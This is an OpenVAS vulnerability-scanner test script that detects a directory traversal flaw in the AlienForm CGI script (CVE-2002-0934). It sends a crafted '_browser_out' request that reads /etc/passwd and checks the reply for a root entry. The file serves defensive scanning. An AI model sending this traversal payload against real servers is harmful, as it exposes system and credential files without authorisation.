###############################################################################
# OpenVAS Vulnerability Test
# $Id: alienform.nasl 6046 2017-04-28 09:02:54Z teissa $
#
# AlienForm CGI script
#
# Authors:
# Andrew Hintz ( http://guh.nu )
# based on code written by Renaud Deraison
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CAN
#
# Copyright:
# Copyright (C) 2002 Andrew Hintz (http://guh.nu)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11027");
  script_version("2019-04-10T13:42:28+0000");
  script_tag(name:"last_modification", value:"2019-04-10 13:42:28 +0000 (Wed, 10 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(4983);
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_cve_id("CVE-2002-0934");
  script_name("AlienForm CGI script");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2002 Andrew Hintz (http://guh.nu)");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://online.securityfocus.com/archive/1/276248/2002-06-08/2002-06-14/0");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The AlienForm CGI script allows an attacker
  to view any file on the target computer, append arbitrary data
  to an existing file, and write arbitrary data to a new file.

  The AlienForm CGI script is installed as either af.cgi or
  alienform.cgi

  For more details, please see the references.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

files = make_list( "/af.cgi", "/alienform.cgi" );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file( files ) {

    url = string( dir, file, "?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd" );

    if( http_vuln_check( port:port, url:url, pattern:".*root:.*:0:[01]:.*" ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );